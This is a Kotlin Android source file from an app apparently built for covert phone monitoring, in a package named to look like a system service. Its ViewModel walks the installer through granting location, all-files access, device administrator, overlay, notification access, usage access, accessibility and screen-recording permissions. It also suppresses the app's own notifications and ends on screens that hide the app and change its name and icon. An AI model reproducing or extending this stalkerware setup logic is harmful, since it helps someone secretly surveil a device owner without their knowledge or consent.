package com.android.services.viewModel

import android.content.Context
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import com.android.services.models.PermissionCounter
import com.android.services.enums.PermissionScreens
import com.android.services.models.PermissionSkip
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.incrementOne

class ManualPermissionViewModel() : ViewModel() {

    private val _permissionScreen = MutableLiveData<PermissionScreens>(null)
    val permissionScreen: LiveData<PermissionScreens> = _permissionScreen

    private val _permissionCounterList = MutableLiveData<List<PermissionCounter>>(emptyList())
    private val _hideApp = MutableLiveData<Int>(1)
    val hideApp: LiveData<Int> = _hideApp

//    private val _dontHideApp = MutableLiveData<Int>(0)
//    val dontHideApp: LiveData<Int> = _dontHideApp

    private val _changeAppNameAndIcon = MutableLiveData<Int>(0)
    val changeAppNameAndIcon: LiveData<Int> = _changeAppNameAndIcon

    fun setHideApp(value: Int) {
        _hideApp.value = value
    }
//    fun setDontHideApp(value: Int) {
//        _dontHideApp.value = value
//    }
    fun setChanegAppNameAndIcon(value: Int) {
        _changeAppNameAndIcon.value = value
    }

    fun getPermissionCounterLists(): List<PermissionCounter> = _permissionCounterList.value!!

    private fun setPermissionCounterList(permissionsList: List<PermissionCounter>) {
        _permissionCounterList.value = permissionsList
    }

    fun preparePermissionsCounterList() {
        val permissionCounterList: MutableList<PermissionCounter> = mutableListOf()
        var permissionNumber = 0

        if (AppConstants.osGreaterThanOrEqualToTen) {
            permissionNumber = permissionNumber.incrementOne()
            permissionCounterList.add(
                PermissionCounter(
                    PermissionScreens.LOCATION_PERMISSION,
                    permissionNumber,
                    0
                )
            )
        }

        if (AppConstants.osGreaterThanEqualToEleven) {
            permissionNumber = permissionNumber.incrementOne()
            permissionCounterList.add(
                PermissionCounter(
                    PermissionScreens.MANAGEMENT_OF_ALL_FILES,
                    permissionNumber,
                    0
                )
            )
        }

        permissionNumber = permissionNumber.incrementOne()
        permissionCounterList.add(
            PermissionCounter(
                PermissionScreens.DEVICE_ADMIN_PERMISSION,
                permissionNumber,
                0
            )
        )
        permissionNumber = permissionNumber.incrementOne()

        // Draw Over Other App Permission Step
        if (AppConstants.osGreaterThanOrEqualMarshmallow) {
            permissionCounterList.add(
                PermissionCounter(
                    PermissionScreens.DRAW_OVER_OTHER_APPS,
                    permissionNumber,
                    0
                )
            )
            permissionNumber = permissionNumber.incrementOne()
        }

        permissionCounterList.add(
            PermissionCounter(
                PermissionScreens.NOTIFICATION_ACCESS_PERMISSION,
                permissionNumber,
                0
            )
        )
        permissionNumber = permissionNumber.incrementOne()

        permissionCounterList.add(
            PermissionCounter(
                PermissionScreens.DISABLE_NOTIFICATION_ACCESS,
                permissionNumber,
                0
            )
        )
        permissionNumber = permissionNumber.incrementOne()

        permissionCounterList.add(
            PermissionCounter(
                PermissionScreens.USAGE_ACCESS_PERMISSION,
                permissionNumber,
                0
            )
        )
        permissionNumber = permissionNumber.incrementOne()

        permissionCounterList.add(
            PermissionCounter(
                PermissionScreens.ACCESSIBILITY_PERMISSION,
                permissionNumber,
                0
            )
        )
        permissionNumber = permissionNumber.incrementOne()

        if (AppConstants.osGreaterThanOrEqualLollipop) {
            permissionNumber = permissionNumber.incrementOne()
            permissionCounterList.add(
                PermissionCounter(
                    PermissionScreens.SCREEN_RECORD_PERMISSION,
                    permissionNumber,
                    0
                )
            )
        }

        permissionCounterList.forEach {
            it.totalPermissions = permissionNumber
        }
        setPermissionCounterList(permissionCounterList)
    }

    fun setPermissionScreen(context: Context, permissionScreens: PermissionScreens? = null) {
        if (permissionScreens != null) {
            _permissionScreen.value = permissionScreens!!
        } else {
            if (AppConstants.osGreaterThanOrEqualToTen && !AppUtils.isLocationPermissionGranted(
                    context
                ) && !AppUtils.shouldSkipPermission(PermissionScreens.LOCATION_PERMISSION)
            ) {
                _permissionScreen.value = PermissionScreens.LOCATION_PERMISSION
            } else if (AppConstants.osGreaterThanEqualToEleven && !AppUtils.isManagementOfAllFilesPermissionGranted(
                    context
                ) && !AppUtils.shouldSkipPermission(PermissionScreens.MANAGEMENT_OF_ALL_FILES)
            ) {
                _permissionScreen.value = PermissionScreens.MANAGEMENT_OF_ALL_FILES
            } else if (!AppUtils.isEnabledAsDeviceAdministrator() && !AppUtils.shouldSkipPermission(
                    PermissionScreens.DEVICE_ADMIN_PERMISSION
                )
            ) {
                _permissionScreen.value = PermissionScreens.DEVICE_ADMIN_PERMISSION
            } else if (AppConstants.osGreaterThanOrEqualMarshmallow && !AppUtils.displayOverOtherAppsGranted(
                    context
                ) && !AppUtils.shouldSkipPermission(PermissionScreens.DRAW_OVER_OTHER_APPS)
            ) {
                _permissionScreen.value = PermissionScreens.DRAW_OVER_OTHER_APPS
            } else if (!AppUtils.isNotificationAccessEnabled(context) && !AppUtils.shouldSkipPermission(
                    PermissionScreens.NOTIFICATION_ACCESS_PERMISSION
                )
            ) {
                _permissionScreen.value = PermissionScreens.NOTIFICATION_ACCESS_PERMISSION
            } else if (AppUtils.areNotificationsEnabled(context) && !AppUtils.shouldSkipPermission(
                    PermissionScreens.DISABLE_NOTIFICATION_ACCESS
                )
            ) {
                _permissionScreen.value = PermissionScreens.DISABLE_NOTIFICATION_ACCESS
            }else if (!AppUtils.isUsageAccessPermissionGranted(context) && !AppUtils.shouldSkipPermission(
                    PermissionScreens.USAGE_ACCESS_PERMISSION
                )
            ) {
                _permissionScreen.value = PermissionScreens.USAGE_ACCESS_PERMISSION
            } else if (!AppUtils.isAccessibilityEnabled(context) && !AppUtils.shouldSkipPermission(
                    PermissionScreens.ACCESSIBILITY_PERMISSION
                )
            ) {
                _permissionScreen.value = PermissionScreens.ACCESSIBILITY_PERMISSION
            } else if (AppConstants.screenRecordingIntent == null && AppConstants.osGreaterThanOrEqualLollipop
                && !AppUtils.shouldSkipPermission(PermissionScreens.SCREEN_RECORD_PERMISSION)
            ) {
                _permissionScreen.value = PermissionScreens.SCREEN_RECORD_PERMISSION
            } else {
                _permissionScreen.value = PermissionScreens.HIDE_APP
            }
        }
    }

    fun getPermissionScreen(): PermissionScreens = _permissionScreen.value!!
}